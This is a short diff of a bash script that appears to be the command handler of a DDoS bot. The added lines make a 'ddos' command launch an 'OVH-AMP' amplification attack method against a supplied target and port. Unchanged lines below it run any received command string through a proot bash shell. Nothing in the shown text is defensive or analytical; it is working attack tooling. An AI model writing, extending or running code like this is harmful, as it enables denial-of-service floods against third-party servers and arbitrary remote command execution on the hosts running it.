@@ -56,9 +56,9 @@ if [[ -f "./installed" ]]; then
         IFS=' ' read -r -a args <<< "$cmdtorun"
 
         if [ "${args[0]}" == "ddos" ]; then
-            #for arg in "${args[@]:1}"; do
-               echo "${args[1]}"
-            #done
+
+               ./root/methods/OVH-AMP "${args[1]}" "${args[2]}"
+               
         fi
         
         ./libraries/proot -S . /bin/bash -c "$cmdtorun"
